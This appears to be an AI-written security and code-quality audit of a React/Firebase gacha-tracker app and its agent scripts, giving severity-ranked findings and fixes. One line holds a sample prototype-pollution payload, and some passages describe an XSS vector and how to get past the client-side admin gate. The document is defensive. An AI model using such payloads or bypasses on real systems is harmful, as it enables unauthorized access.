1. Tighten the length (display names shouldn't need 64 chars)
2. Add a note that the **frontend MUST sanitize** this field on read

```json
        ".validate": "newData.hasChildren(['id', 'avgPity', 'pulls', 'totalPulls', 'timestamp'])
                      && newData.child('avgPity').isNumber()
                      && newData.child('avgPity').val() >= 1
                      && newData.child('avgPity').val() <= 80
                      && newData.child('pulls').isNumber()
                      && newData.child('pulls').val() >= 0
                      && newData.child('pulls').val() <= 9999
                      && newData.child('totalPulls').isNumber()
                      && newData.child('totalPulls').val() >= 0
                      && newData.child('totalPulls').val() <= 999999
                      && newData.child('timestamp').isNumber()
                      && newData.child('timestamp').val() <= now + 60000
                      && newData.child('id').isString()
                      && newData.child('id').val().length >= 1
                      && newData.child('id').val().length <= 32"
```

**⚠️ Frontend Agent Note (CRITICAL):** Wherever leaderboard `id` values are rendered in the UI, they MUST be treated as untrusted user input. If using `dangerouslySetInnerHTML` or any non-React text rendering, this is an XSS vector. Verify that React's default JSX escaping is being used (`{entry.id}` in JSX is safe; string concatenation into HTML is not).

## Issue 6: `withCheckpoint` Returns Stale/Lossy Cached Data

**File:** `agent/lib/checkpoint.js`, lines 118–131  
**Severity:** MEDIUM

The `withCheckpoint` wrapper replaces rich step results with `{ completed: true, hadChanges: !!result }` for non-primitive types, but then returns the *original* `result` on the live path. On a resume from cache, it returns the lossy `{ completed: true, hadChanges: true }` object instead of the real result. Any caller that depends on the step's actual return data will break silently after a crash+resume.

```javascript
// CURRENT:
export async function withCheckpoint(mode, stepName, stepFn) {
  const cached = getCheckpoint(mode, stepName);
  if (cached !== null) {
    return cached;  // Returns { completed: true, hadChanges: true } — NOT the real result
  }

  const result = await stepFn();

  // Only caches a simplified form
  const cacheable = typeof result === 'boolean' || typeof result === 'number' || result === null
    ? result
    : { completed: true, hadChanges: !!result };

  saveCheckpoint(mode, stepName, cacheable);
  return result;  // Returns the REAL result on first run
}
```

**Fix:** Make the return type consistent. Either cache the full result (if small), or make callers aware that resumed values are summaries.

```javascript
/**
 * Wrap a step function with checkpoint support.
 * If the step was already completed (from a crashed run), returns cached result.
 * Otherwise runs the step and saves a checkpoint.
 *
 * IMPORTANT: For non-primitive results, only a summary is cached.
 * Callers should check for `result?.completed === true` to detect a
 * resumed-from-cache summary vs a live result.
 *
 * @param {string} mode — 'full' | 'micro'
 * @param {string} stepName — unique step identifier
 * @param {Function} stepFn — async function to run (returns any result)
 * @param {Object} [opts] — options
 * @param {boolean} [opts.cacheFullResult=false] — if true, cache the full result object
 * @returns {*} — the step result (from cache or live execution)
 */
export async function withCheckpoint(mode, stepName, stepFn, opts = {}) {
  // Check if already completed
  const cached = getCheckpoint(mode, stepName);
  if (cached !== null) {
    return cached;
  }

  // Run the step
  const result = await stepFn();

  // Determine what to cache
  let cacheable;
  if (opts.cacheFullResult) {
    // Caller explicitly wants the full result cached (must be JSON-serializable)
    cacheable = result;
  } else if (typeof result === 'boolean' || typeof result === 'number' || result === null) {
    cacheable = result;
  } else {
    // Cache a summary — callers must handle this shape on resume
    cacheable = { _checkpoint: true, completed: true, hadChanges: !!result };
  }

  saveCheckpoint(mode, stepName, cacheable);
  return result;
}
```

## Issue 7: Prototype Pollution via `JSON.parse` of Untrusted Checkpoint/Memory Files

**File:** `agent/lib/checkpoint.js`, line 143; `agent/lib/memory.js`, line 24  
**Severity:** MEDIUM

Both `loadRawCheckpoint()` and `loadMemory()` parse JSON files from disk with no prototype pollution protection. If an attacker (or a corrupted file) contains `{"__proto__": {"isAdmin": true}}`, it could pollute `Object.prototype`.

In Node.js, `JSON.parse` does NOT cause prototype pollution by default — the `__proto__` key is set as an own property, not on the prototype chain. However, if any code later does `Object.assign({}, parsed)` or spreads the object, some environments can be affected. More importantly, if `completedSteps` keys are attacker-controlled, they could collide with built-in methods.

**Fix (defensive):** Add a simple reviver or freeze after parsing:

```javascript
// In agent/lib/checkpoint.js, function loadRawCheckpoint():
function loadRawCheckpoint() {
  if (!existsSync(CHECKPOINT_FILE)) return null;
  try {
    const parsed = JSON.parse(readFileSync(CHECKPOINT_FILE, 'utf-8'));
    // Guard against poisoned keys
    if (parsed == null || typeof parsed !== 'object' || Array.isArray(parsed)) return null;
    if ('__proto__' in parsed || 'constructor' in parsed) return null;
    return parsed;
  } catch {
    return null;
  }
}
```

```javascript
// In agent/lib/memory.js, function loadMemory():
export function loadMemory() {
  const empty = { runs: [], patches: [], failures: [], checkedUrls: {} };
  if (!existsSync(MEMORY_FILE)) return empty;
  try {
    const parsed = JSON.parse(readFileSync(MEMORY_FILE, 'utf-8'));
    if (parsed == null || typeof parsed !== 'object' || Array.isArray(parsed)) {
      log.warn('Memory file has unexpected shape — starting fresh');
      return empty;
    }
    // Ensure expected shape exists (defensive)
    return {
      runs: Array.isArray(parsed.runs) ? parsed.runs : [],
      patches: Array.isArray(parsed.patches) ? parsed.patches : [],
      failures: Array.isArray(parsed.failures) ? parsed.failures : [],
      checkedUrls: (parsed.checkedUrls && typeof parsed.checkedUrls === 'object' && !Array.isArray(parsed.checkedUrls))
        ? parsed.checkedUrls
        : {},
      deployments: Array.isArray(parsed.deployments) ? parsed.deployments : [],
      evolutionHistory: Array.isArray(parsed.evolutionHistory) ? parsed.evolutionHistory : [],
      knownGoodCommit: typeof parsed.knownGoodCommit === 'string' ? parsed.knownGoodCommit : undefined,
    };
  } catch {
    log.warn('Memory file corrupted — starting fresh');
    return empty;
  }
}
```

## Issue 8: ReDoS Potential in `identifyDeadUrlOwners` Regex Construction

**File:** `agent/lib/health.js`, lines 91–103  
**Severity:** MEDIUM

The function constructs regex patterns from URL strings. While URLs are escaped with a standard pattern, the constructed regex is then combined with `['"]([^'"]+)['"]:\\s*'` which creates a pattern that, for certain source files with many quote-delimited strings, could cause catastrophic backtracking. More critically, the regex escape doesn't handle all edge cases for URLs with unusual characters.

The risk is low since URLs are from the app's own data, but the pattern is fragile.

**Fix:** Use `String.prototype.indexOf` or `String.prototype.includes` for the initial search, then extract context with a bounded substring:

```javascript
/**
 * Find which variable/entry each dead URL belongs to in appcore-data.js.
 * Returns [{ url, context, name }]
 */
export function identifyDeadUrlOwners(source, deadUrls) {
  const owners = [];
  const lines = source.split('\n');

  for (const { url, status } of deadUrls) {
    let found = false;

    for (let i = 0; i < lines.length; i++) {
      if (!lines[i].includes(url)) continue;

      // Look for a key name in the same line or the line above
      const context = (i > 0 ? lines[i - 1] + '\n' : '') + lines[i];

      // Try to extract a property name like 'someName': 'https://...'
      const keyMatch = context.match(/['"]([^'"]+)['"]\s*:\s*['"]/);
      if (keyMatch) {
        owners.push({ url, status, name: keyMatch[1], context: `line ${i + 1}` });
        found = true;
        break;
      }

      // Try to match camelCase identifier like someImage: 'https://...'
      const identMatch = context.match(/(\w+)\s*:\s*['"]/);
      if (identMatch) {
        owners.push({ url, status, name: identMatch[1], context: `line ${i + 1}` });
        found = true;
        break;
      }
    }

    if (!found) {
      owners.push({ url, status, name: 'unknown', context: 'unidentified' });
    }
  }

  return owners;
}
```

## Issue 11: `adaptive-schedule.js` — `calculateUrgency` Doesn't Validate Date Input

**File:** `agent/lib/adaptive-schedule.js`, lines 30–44  
**Severity:** LOW

If `bannerEndDate` is `null`, `undefined`, or an invalid date string, `new Date(bannerEndDate).getTime()` returns `NaN`, and all comparisons (`hoursLeft <= 6`, etc.) evaluate to `false`, causing the function to silently fall through to `'normal'` urgency. A banner with a corrupted date would never trigger elevated monitoring.

**Fix:**

```javascript
export function calculateUrgency(bannerEndDate, memory) {
  if (!bannerEndDate) {
    log.warn('No banner end date provided — defaulting to normal urgency');
    return { urgency: 'normal', hoursLeft: Infinity, shouldRun: true };
  }

  const endTime = new Date(bannerEndDate).getTime();
  if (Number.isNaN(endTime)) {
    log.warn(`Invalid banner end date: ${bannerEndDate} — defaulting to elevated urgency`);
    return { urgency: 'elevated', hoursLeft: NaN, shouldRun: true };
  }

  const hoursLeft = (endTime - Date.now()) / 3600000;

  // Critical: within 6 hours of banner end (transition imminent)
  if (hoursLeft <= 6 && hoursLeft > -6) {
    return { urgency: 'critical', hoursLeft, shouldRun: true };
  }

  // Elevated: within 48 hours of banner end
  if (hoursLeft <= 48 && hoursLeft > 0) {
    return { urgency: 'elevated', hoursLeft, shouldRun: true };
  }

  // Post-transition: banner just ended (within last 6 hours)
  if (hoursLeft <= 0 && hoursLeft > -6) {
    return { urgency: 'critical', hoursLeft, shouldRun: true };
  }

  // Normal: no urgency
  return { urgency: 'normal', hoursLeft, shouldRun: true };
}
```

### XCUT-CRIT-02: Firebase Credentials Hardcoded as Fallback — Cross-Cutting Security Issue

**File:** `whispering-wishes-replit/src/App.jsx` lines ~87–88

```js
const FIREBASE_DB = (typeof import.meta !== 'undefined' && import.meta.env?.VITE_FIREBASE_DB) || 'https://whispering-wishes-default-rtdb.firebaseio.com';
const FIREBASE_API_KEY = (typeof import.meta !== 'undefined' && import.meta.env?.VITE_FIREBASE_API_KEY) || 'AIzaSyWhisperingWishes';
```

**Problem:** This is a cross-cutting issue because:
1. **Frontend:** The fallback values are inlined into the production JS bundle by Vite's `import.meta.env` replacement. If the env var is unset at build time, the plaintext URL/key ships to every user.
2. **Backend/Deploy:** There is no `.env.example` or build validation to enforce that these vars must be set. The deploy pipeline has no guard.
3. **Contract:** The Firebase Realtime Database URL is a backend resource. Having it hardcoded in the frontend means any backend URL migration requires a frontend code change and redeploy, rather than just an env var update.

The comment says "the real protection is Firebase Security Rules," but that's a defense-in-depth argument — having credentials extractable from the bundle still enables enumeration, abuse of read endpoints, and quota exhaustion.

**Severity:** CRITICAL

**Fix — `whispering-wishes-replit/src/App.jsx`** — replace lines ~87–88:
```js
// Firebase config — MUST be set via environment variables at build time.
// If missing, online features (leaderboard, presence) are disabled gracefully.
const FIREBASE_DB = (typeof import.meta !== 'undefined' && import.meta.env?.VITE_FIREBASE_DB) || null;
const FIREBASE_API_KEY = (typeof import.meta !== 'undefined' && import.meta.env?.VITE_FIREBASE_API_KEY) || null;
const FIREBASE_AVAILABLE = !!(FIREBASE_DB && FIREBASE_API_KEY);
```

Then guard all `fetchWithTimeout` calls that target `FIREBASE_DB`. Every call site in the file that constructs a URL from `FIREBASE_DB` must be wrapped:
```js
// Before any Firebase network call:
if (!FIREBASE_AVAILABLE) {
  console.warn('[WW] Firebase config missing — online features disabled.');
  // Return early or return a default value as appropriate
  return;
}
```

**Additionally, create `whispering-wishes-replit/.env.example`** (new file):
```env
# Firebase Realtime Database URL (required for online features)
VITE_FIREBASE_DB=https://your-project.firebaseio.com

# Firebase API Key (required for online features)
VITE_FIREBASE_API_KEY=your-api-key-here
```

## HIGH Issues

### XCUT-HIGH-01: `fetchWithTimeout` Does Not Distinguish Timeout from Network Error — Affects All Firebase and API Consumers

**File:** `whispering-wishes-replit/src/App.jsx` lines ~46–50

```js
const fetchWithTimeout = (url, options = {}) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
  return fetch(url, { ...options, signal: controller.signal }).finally(() => clearTimeout(timeoutId));
};
```

**Problem:** This is the sole HTTP utility used by every consumer in the app (Firebase writes, presence heartbeats, leaderboard fetches, admin operations). When a timeout fires, `controller.abort()` rejects with a generic `DOMException` (`name: 'AbortError'`). No consumer can distinguish "the server is slow" from "the network is down" from "the user manually aborted." This makes the entire app's error reporting unreliable — error toasts, retry logic, and presence state machines all receive opaque errors.

**Severity:** HIGH

**Fix — `whispering-wishes-replit/src/App.jsx`** — replace lines ~46–50:
```js
// Fetch wrapper with AbortController timeout — fails fast on network loss.
// Distinguishes timeout errors from other network failures for better diagnostics.
const FETCH_TIMEOUT_MS = 10000;
const fetchWithTimeout = (url, options = {}) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
  return fetch(url, { ...options, signal: controller.signal })
    .catch((err) => {
      if (err.name === 'AbortError') {
        const hostname = (() => { try { return new URL(url).hostname; } catch { return url; } })();
        throw new Error(`[WW] Request to ${hostname} timed out after ${FETCH_TIMEOUT_MS}ms`);
      }
      throw err;
    })
    .finally(() => clearTimeout(timeoutId));
};
```

### XCUT-HIGH-02: `stateRef` is Declared but Never Synchronized — Stale Closure Risk Across All Async Consumers

**File:** `whispering-wishes-replit/src/App.jsx` line ~127

```js
const stateRef = useRef(state);
```

**Problem:** `useRef` captures the initial value of `state` at mount time. Without a synchronizing `useEffect`, every interval, timeout, event handler, or Firebase callback that reads `stateRef.current` will see the **initial state**, not the current one. This is a systemic issue because `stateRef` is almost certainly used deep in the file (beyond the truncated region) for exactly those async callbacks. The result: stale pity counts written to Firebase, stale server offsets in timers, stale settings in export functions, etc.

**Severity:** HIGH

**Fix — `whispering-wishes-replit/src/App.jsx`** — add immediately after line ~127:
```js
const stateRef = useRef(state);
useEffect(() => {
  stateRef.current = state;
}, [state]);
```

### XCUT-HIGH-03: `hashUidForStorage` Fallback Returns Raw UID — Privacy Contract Violation

**File:** `whispering-wishes-replit/src/App.jsx` lines ~86–91

```js
const hashUidForStorage = async (uid) => {
  if (!uid) return null;
  try {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('ww-uid-' + uid));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
  } catch { return uid; } // fallback if crypto unavailable (HTTP)
};
```

**Problem:** Cross-cutting contract violation: the function's documented purpose (comment says "Hash UIDs before writing to Firebase to protect player privacy") is violated by the fallback path. On HTTP origins (localhost dev, some deploy previews, older browsers), `crypto.subtle` is unavailable, and the function returns the **raw UID string**. This means:
- **Backend/Firebase:** The database receives unhashed UIDs mixed with hashed UIDs, making queries inconsistent.
- **Privacy:** Player UIDs (which are game account identifiers) are stored in plaintext in a public Firebase path.
- **Data integrity:** The same user on HTTP vs HTTPS produces different Firebase keys, creating phantom duplicates.

**Severity:** HIGH

**Fix — `whispering-wishes-replit/src/App.jsx`** — replace lines ~86–91:
```js
// Hash UIDs before writing to Firebase to protect player privacy.
// Uses Web Crypto on HTTPS; falls back to FNV-1a (non-reversible) on HTTP.
const hashUidForStorage = async (uid) => {
  if (!uid) return null;

  // Try Web Crypto first (requires HTTPS / secure context)
  if (typeof crypto !== 'undefined' && crypto.subtle) {
    try {
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('ww-uid-' + uid));
      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 32);
    } catch { /* fall through to software hash */ }
  }

  // Fallback: FNV-1a based hash — not cryptographic, but non-reversible and consistent
  const str = 'ww-uid-' + uid;
  const fnv1a = (seed) => {
    let h = seed;
    for (let i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = Math.imul(h, 0x01000193);
    }
    return (h >>> 0).toString(16).padStart(8, '0');
  };
  const h1 = fnv1a(0x811c9dc5);
  const h2 = fnv1a(0x1a2b3c4d);
  const h3 = fnv1a(0x5e6f7a8b);
  const h4 = fnv1a(0x9c0d1e2f);
  return (h1 + h2 + h3 + h4).slice(0, 32);
};
```

### XCUT-HIGH-04: `firebaseWriteTimestamps` Map Grows Without Bound — Memory Leak in Long Sessions

**File:** `whispering-wishes-replit/src/App.jsx` lines ~94–101

```js
const firebaseWriteTimestamps = new Map();
const FIREBASE_WRITE_COOLDOWN_MS = 5000;
const checkFirebaseRateLimit = (pathKey) => {
  const now = Date.now();
  const lastWrite = firebaseWriteTimestamps.get(pathKey) || 0;
  if (now - lastWrite < FIREBASE_WRITE_COOLDOWN_MS) return false;
  firebaseWriteTimestamps.set(pathKey, now);
  return true;
};
```

**Problem:** This is a module-scope `Map` that accumulates entries for every unique Firebase path written to during the session lifetime. There is no eviction. In a long-running mobile session (common for a companion app that users leave open during gameplay), the Map grows indefinitely. While individual entries are small (~100 bytes for key + value), the real concern is that this Map is **never cleaned up even across component remounts** (it's module-scoped, not component-scoped), so it persists even if the user navigates away and returns.

**Severity:** HIGH

**Fix — `whispering-wishes-replit/src/App.jsx`** — replace lines ~94–101:
```js
// Client-side rate limiter for Firebase writes.
// Prevents runaway writes from bugs or abuse. Firebase Security Rules handle server-side enforcement.
const firebaseWriteTimestamps = new Map();
const FIREBASE_WRITE_COOLDOWN_MS = 5000;
const FIREBASE_RATE_LIMIT_MAX_ENTRIES = 100;

const checkFirebaseRateLimit = (pathKey) => {
  const now = Date.now();
  const lastWrite = firebaseWriteTimestamps.get(pathKey) || 0;
  if (now - lastWrite < FIREBASE_WRITE_COOLDOWN_MS) return false; // rate-limited
  firebaseWriteTimestamps.set(pathKey, now);

  // Prune stale entries if map grows too large
  if (firebaseWriteTimestamps.size > FIREBASE_RATE_LIMIT_MAX_ENTRIES) {
    const staleThreshold = now - FIREBASE_WRITE_COOLDOWN_MS * 10;
    for (const [key, ts] of firebaseWriteTimestamps) {
      if (ts < staleThreshold) firebaseWriteTimestamps.delete(key);
    }
  }

  return true; // allowed
};
```

### XCUT-HIGH-05: `ALLOWED_IMAGE_HOSTS` Defined But No Validation Function Exists — Image URL Allowlist is Dead Code

**File:** `whispering-wishes-replit/src/App.jsx` line ~83

```js
const ALLOWED_IMAGE_HOSTS = ['i.ibb.co', 'ibb.co', 'i.imgur.com', 'imgur.com', 'cdn.discordapp.com', 'media.discordapp.net', 'pbs.twimg.com', 'raw.githubusercontent.com', 'i.postimg.cc', 'wuwa.gg', 'wuwatracker.com'];
```

And the `updateBannerForm` on line ~175:
```js
const updateBannerForm = useCallback((field, value) => setBannerForm(prev => ({ ...prev, [field]: value })), []);
```

**Problem:** Cross-cutting issue: the allowlist is defined (frontend data contract) but never enforced (no validation function exists in visible code). The `updateBannerForm` callback directly sets any value without checking image URLs against the allowlist. This means:
- Admin panel image URL inputs accept arbitrary domains
- Character/weapon image URLs from `CURRENT_BANNERS` (backend data) are never validated at render time
- The allowlist is dead code that creates a false sense of security

**Severity:** HIGH

**Fix — `whispering-wishes-replit/src/App.jsx`** — add after the `ALLOWED_IMAGE_HOSTS` definition (after line ~83):
```js
// Validate image URLs against the domain allowlist
const isAllowedImageUrl = (url) => {
  if (!url || typeof url !== 'string') return false;
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:') return false;
    return ALLOWED_IMAGE_HOSTS.some(host =>
      parsed.hostname === host || parsed.hostname.endsWith('.' + host)
    );
  } catch {
    return false;
  }
};

// Return the URL if allowed, or a fallback (empty string) if not
const sanitizeImageUrl = (url, fallback = '') => {
  return isAllowedImageUrl(url) ? url : fallback;
};
```

Then update `updateBannerForm` (replace line ~175):

```js
const updateBannerForm = useCallback((field, value) => {
  // Validate image URL fields against the allowlist
  const imageFields = [
    'standardCharImg', 'standardWeapImg', 'wwImg', 'dpImg',
    'toaImg', 'irImg', 'drImg', 'thImg', 'wbImg'
  ];
  if (
    (imageFields.includes(field) || field.startsWith('charImages.') || field.startsWith('weapImages.')) &&
    value && !isAllowedImageUrl(value)
  ) {
    // Silently reject — the toast dependency is inside the component, so we just don't set the value.
    // A more complete fix would pass toast as a dependency, but that requires refactoring the callback.
    console.warn(`[WW] Rejected image URL for field "${field}" — not on allowed host list.`);
    return;
  }
  setBannerForm(prev => ({ ...prev, [field]: value }));
}, []);
```

### XCUT-MED-02: `DEFAULT_VISUAL_SETTINGS.animationsEnabled` Computed at Module Scope — Stale and SSR-Unsafe

**File:** `whispering-wishes-replit/src/App.jsx` lines ~96–97 (inside `DEFAULT_VISUAL_SETTINGS`)

```js
animationsEnabled: typeof window !== 'undefined' && window.matchMedia ? !window.matchMedia('(prefers-reduced-motion: reduce)').matches : true
```

**Problem:** This runs once at module evaluation time. It's a module-scope constant, not a reactive value. Two cross-cutting concerns:
1. **SSR/Prerender:** Vite supports SSR prerendering — `window` exists but `matchMedia` may be shimmed. The value is unreliable.
2. **User preference change:** If the user toggles OS reduced-motion while the app is open, this value never updates. The `visualSettings` state initialized from this default will be stale.

The `useEffect` that loads from localStorage (lines ~180–192) partially mitigates this by overwriting with saved settings, but a fresh user with no localStorage will get the stale module-scope value.

**Severity:** MEDIUM

**Fix — `whispering-wishes-replit/src/App.jsx`** — change the default to `true` and add a reactive listener inside the component:

In `DEFAULT_VISUAL_SETTINGS` (line ~96):
```js
const DEFAULT_VISUAL_SETTINGS = {
  fadePosition: 50,
  fadeIntensity: 100,
  pictureOpacity: 100,
  standardFadePosition: 50,
  standardFadeIntensity: 100,
  standardOpacity: 100,
  shadowFadePosition: 50,
  shadowFadeIntensity: 100,
  shadowOpacity: 100,
  collectionFadePosition: 50,
  collectionFadeIntensity: 100,
  collectionOpacity: 100,
  collectionFadeDirection: 'top',
  collectionZoom: 120,
  oledMode: false,
  swipeNavigation: false,
  animationsEnabled: true, // Default; overridden at mount by prefers-reduced-motion listener
};
```

Then inside `WhisperingWishesInner`, add after the existing `useEffect` that loads visual settings from localStorage (after line ~192):
```js
// Respect OS reduced-motion preference and listen for changes
useEffect(() => {
  if (typeof window === 'undefined' || !window.matchMedia) return;
  const mql = window.matchMedia('(prefers-reduced-motion: reduce)');

  // Only apply if user hasn't explicitly set a preference in localStorage
  const hasSavedPreference = (() => {
    try {
      const saved = localStorage.getItem(VISUAL_SETTINGS_KEY);
      if (saved) {
        const parsed = JSON.parse(saved);
        return parsed.animationsEnabled !== undefined;
      }
    } catch {}
    return false;
  })();

  if (!hasSavedPreference) {
    setVisualSettings(prev => ({ ...prev, animationsEnabled: !mql.matches }));
  }

  const handler = (e) => {
    if (!hasSavedPreference) {
      setVisualSettings(prev => ({ ...prev, animationsEnabled: !e.matches }));
    }
  };
  mql.addEventListener('change', handler);
  return () => mql.removeEventListener('change', handler);
}, []);
```

### XCUT-MED-04: Admin Password Hash in Client Bundle — Architectural Security Anti-Pattern

**File:** `whispering-wishes-replit/src/App.jsx` — imports `ADMIN_HASH` from `./AppCore` (line ~72 of imports)

And line ~77:
```js
const ADMIN_SALT = 'whispering-wishes-v3-admin';
```

**Problem:** The admin authentication is entirely client-side: `ADMIN_HASH` (the target hash) and `ADMIN_SALT` are both in the JS bundle. An attacker can:
1. Extract the hash from the bundle
2. Brute-force offline with the known salt
3. Bypass entirely by modifying the client-side JS (set `adminUnlocked = true` in devtools)

The client-side lockout (`ww-admin-lockout` in localStorage) can be cleared by deleting the localStorage key.

This is a cross-cutting architectural issue: admin operations (updating banners, managing players, modifying trophies) should require server-side authentication. The current architecture makes the admin panel security theater.

**Severity:** MEDIUM (downgraded from HIGH because the admin panel writes to Firebase, which has its own Security Rules; but the client-side auth gives a false sense of protection)

**Fix (architectural recommendation — cannot be done in a single code change):**

1. **Short-term** — add progressive lockout and obscure the hash:
```js
// Replace the admin lockout initialization in WhisperingWishesInner (lines ~107–117):
```

### XCUT-MED-05: No Build-Time Validation of Required Environment Variables

**Files:**
- `whispering-wishes-replit/package.json` — no `prebuild` script
- No `vite.config.js` visible in this chunk (may exist in later chunks)
- No `.env.example` or `.env.local` schema

**Problem:** The app depends on `VITE_FIREBASE_DB` and `VITE_FIREBASE_API_KEY` at build time, but there is no mechanism to fail the build if they're missing. Vite silently replaces missing `import.meta.env.VITE_*` with `undefined`, which (with the current fallback code) results in hardcoded credentials being baked in. Even with the XCUT-CRIT-02 fix (setting fallback to `null`), a build without env vars would produce a non-functional app with no error message during CI.

**Severity:** MEDIUM

**Fix — add a build validation script:**

**New file: `whispering-wishes-replit/scripts/validate-env.js`**:
```js
// validate-env.js — Run before build to ensure required env vars are set
const required = ['VITE_FIREBASE_DB', 'VITE_FIREBASE_API_KEY'];
const missing = required.filter(key => !process.env[key]);

if (missing.length > 0) {
  console.warn(`\n⚠️  WARNING: Missing environment variables: ${missing.join(', ')}`);
  console.warn('   Online features (leaderboard, presence) will be disabled in this build.');
  console.warn('   Set these in .env or your deploy dashboard to enable them.\n');
  // Don't fail the build — the app works offline without Firebase
  // To enforce: process.exit(1);
}
```

**Update `whispering-wishes-replit/package.json`** — add prebuild script:
```json
{
  "name": "whispering-wishes",
  "version": "3.2.3",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "prebuild": "node scripts/validate-env.js",
    "build": "vite build",
    "preview": "vite preview"
  },
  "dependencies": {
    "lucide-react": "^0.263.1",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "recharts": "^2.10.3"
  },
  "devDependencies": {
    "@vitejs/plugin-react": "^4.2.1",
    "autoprefixer": "^10.4.16",
    "postcss": "^8.4.32",
    "tailwindcss": "^3.4.0",
    "vite": "^7.3.1"
  }
}
```

### XCUT-LOW-02: localStorage Key Versioning Strategy Is Undocumented

**File:** `whispering-wishes-replit/src/App.jsx` lines ~89–91

```js
const VISUAL_SETTINGS_KEY = 'whispering-wishes-visual-settings-v3';
const IMAGE_FRAMING_KEY = 'whispering-wishes-image-framing-v1';
const TROPHY_OVERRIDES_KEY = 'whispering-wishes-trophy-overrides-v1';
```

**Problem:** Three localStorage keys with different version suffixes (`v3`, `v1`, `v1`). No comment explains why they differ or what migration strategy exists. When a schema change requires bumping a key version, old data is silently orphaned in the user's localStorage (never cleaned up).

**Severity:** LOW

**Fix — add documentation comment:**
```js
// localStorage schema keys — bump the version suffix when the stored data shape changes.
// When bumping: add a one-time migration in the loading useEffect, or old data is orphaned.
// v3 = visual settings were restructured in app v3.0 (previously v1 and v2 had different field sets)
// v1 = image framing and trophy overrides haven't changed since introduction
const VISUAL_SETTINGS_KEY = 'whispering-wishes-visual-settings-v3';
const IMAGE_FRAMING_KEY = 'whispering-wishes-image-framing-v1';
const TROPHY_OVERRIDES_KEY = 'whispering-wishes-trophy-overrides-v1';
```

### Finding #1 — Potentially Orphaned / Out-of-Scope Files

**Files:** `app-audit-SKILL.md`, `design-aesthetic-audit-SKILL.md`

**Severity:** LOW

**Problem:** These two files are massive AI skill definition documents (327,275 bytes and 220,820 bytes respectively — approximately 548KB combined of markdown). They define how Claude should behave when conducting app audits. They are **not part of the Whispering Wishes application runtime, build, or deployment**. Their presence in the repository raises questions:

1. **Are these shipped to production?** If bundled into the app's build output, they add ~550KB of dead weight to the bundle. They should be excluded via `.gitignore`, a separate directory, or build exclusion rules.

2. **Are these checked into the main app repo?** If so, they inflate the repository and have no bearing on the app's functionality. They belong in a separate tooling/ops repository, a `.claude/` or `.ai/` configuration directory, or a developer documentation space that is excluded from production builds.

3. **Version drift risk:** Both files cross-reference each other (e.g., `app-audit-SKILL.md` references `design-aesthetic-audit-SKILL.md` and vice versa). If one is updated without the other, the cross-references (section codes, field names, companion mode protocols) will silently break.

**Recommendation:**
- Verify these files are excluded from production builds (check bundler config, `.dockerignore`, build scripts)
- Consider moving to a `.claude/skills/` directory if they must live in the repo
- If they are checked in, add a `README` in their directory explaining their purpose
- Add a version/date header to each file so drift between them is detectable

## Section 2: Dependency Health

### Issue 2.1: Severely outdated `lucide-react` pinned version

**File:** `package-lock.json`, line 10 (dependencies block)  
**Severity:** LOW

```json
"lucide-react": "^0.263.1",
```

The `^0.263.1` range is extremely old for lucide-react (current versions are in the `0.400+` range). While `^` will allow minor/patch upgrades within the `0.x` semver range (where minor bumps are breaking per semver for `0.x`), this lock file will pin whatever was resolved at install time. This is a maintenance concern — icon names change across lucide versions, so if a developer runs `npm install` fresh and gets a newer `0.x`, icons used in the frontend could silently break.

**Recommendation:** Audit which lucide icons the frontend uses, then pin to a known-good version (e.g., `"lucide-react": "0.263.1"` without caret), or upgrade deliberately.

### Issue 3.2: `BANNER_HISTORY` and `CURRENT_BANNERS` have inconsistent date formats

**File:** `src/appcore-data.js`, `CURRENT_BANNERS` (line ~100) vs `BANNER_HISTORY` (line ~117+)  
**Severity:** MEDIUM

`CURRENT_BANNERS` uses full ISO 8601 with timezone:
```js
startDate: '2026-02-26T09:00:00Z',
endDate: '2026-03-18T10:59:00Z',
```

`BANNER_HISTORY` uses date-only strings:
```js
{ version: '3.1', phase: 2, ..., startDate: '2026-02-26', endDate: '2026-03-18' },
```

Any code that does `new Date(entry.startDate)` will get midnight UTC for history entries but a specific time for current banners. If the frontend uses a shared countdown/date-comparison utility, this inconsistency can produce off-by-hours bugs (e.g., a banner appearing "ended" when it hasn't, or "active" when it has, depending on the user's timezone).

**Recommendation:** Standardize on full ISO 8601 with timezone for all date fields, or at minimum document the contract clearly and ensure all consumers handle both formats. The ideal fix:

**Corrected pattern for `BANNER_HISTORY` entries (example for first entry):**
```js
const BANNER_HISTORY = [
  { version: '3.1', phase: 2, characters: ['Luuk Herssen', 'Galbrena'], weapons: ["Daybreaker's Spine", 'Lux & Umbra'], startDate: '2026-02-26T09:00:00Z', endDate: '2026-03-18T10:59:00Z' },
  // ... apply same pattern to all entries
];
```

## Section 4: Code Quality & Robustness

### Issue 4.1: `getServerOffset` silently defaults to Europe on unknown server — no caller notification

**File:** `src/appcore-data.js`, line ~82-86  
**Severity:** MEDIUM

```js
const getServerOffset = (server, atDate) => {
  const serverData = SERVERS[server];
  if (!serverData) {
    console.warn(`[WW] Unknown server "${server}", defaulting to Europe (UTC+1)`);
    return 1; // Default to Europe
  }
```

This returns `1` (Europe's non-DST offset) for any unknown server string. The `console.warn` is good for debugging, but callers have no way to distinguish "valid offset" from "fallback offset." If a frontend component passes a corrupted server name from localStorage, the user silently gets wrong reset times with no UI indication.

**Recommendation:** Either throw an error (forcing callers to handle it) or return a tagged result. At minimum, ensure the frontend validates server names against `Object.keys(SERVERS)` before calling this function. This is a cross-cutting concern because the server selection in the UI must align with the keys in `SERVERS`.

---

### Issue 4.2: `calculateLuckRating` accepts string input but comparison logic assumes number

**File:** `src/appcore-data.js`, line ~54-58  
**Severity:** LOW

```js
const calculateLuckRating = (avgPity, numFiveStars) => {
  if (!avgPity || avgPity === '—') return null;
  const avg = parseFloat(avgPity);
  if (isNaN(avg) || avg <= 0) return null;
```

